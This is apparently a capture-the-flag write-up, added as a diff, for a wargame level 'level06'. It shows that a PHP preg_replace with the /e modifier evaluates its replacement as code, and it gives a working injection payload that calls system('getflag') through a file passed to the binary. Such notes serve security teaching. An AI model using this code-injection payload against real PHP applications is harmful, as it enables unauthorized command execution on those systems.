@@ -1,0 +1,10 @@
+The executable 'level06' executes the 'level06.php' 
+'strings level06' -> /usr/bin/php /home/user/level06/level06.php
+
+in level06.php there is a preg_replace function
+'preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)'
+
+the /e modifier allows for the replacement string to be executed as PHP code 
+
+echo '[x {${system('getflag')}}]' > /tmp/exploit
+./level06 /tmp/exploit
